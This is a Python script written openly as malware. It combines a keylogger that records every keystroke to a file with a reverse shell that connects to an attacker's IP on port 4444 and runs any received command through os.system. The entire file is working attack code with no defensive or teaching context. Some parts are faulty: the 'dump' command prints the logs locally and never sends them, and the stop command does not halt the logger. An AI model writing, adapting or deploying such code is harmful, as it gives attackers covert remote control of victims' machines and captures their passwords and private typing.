import os
import socket
from pynput import keyboard
import threading
import time

# Define log file location
log_file = "keylog.txt"
server_ip = "10.0.1.12"  # Replace with your attacker's IP
server_port = 4444  # Reverse shell listening port

# Create or clear the log file
def clear_log_file():
    with open(log_file, "w") as f:
        f.write("")  # Clear existing log file

# Function to start the keylogger
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char} ")  # Log normal characters
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{str(key)} ")  # Log special keys

# Start listener for key events
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to dump the keylogs
def dump_keylogs():
    with open(log_file, "r") as f:
        logs = f.read()
        print(logs)

# Reverse Shell Setup
def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))
    
    while True:
        # Receive commands from the server
        command = s.recv(1024).decode()
        if command.lower() == "key_start":
            clear_log_file()
            threading.Thread(target=start_keylogger).start()
            s.send(b"Keylogger started")
        elif command.lower() == "key_dump":
            dump_keylogs()
            s.send(b"Key logs dumped")
        elif command.lower() == "key_stop":
            s.send(b"Keylogger stopped")
            break
        elif command.lower() == "exit":
            break
        else:
            os.system(command)  # Execute other shell commands
            s.send(b"Command executed")

    s.close()

# Start the reverse shell in a separate thread
def start_reverse_shell():
    threading.Thread(target=reverse_shell).start()

# Main execution flow
if __name__ == "__main__":
    start_reverse_shell()
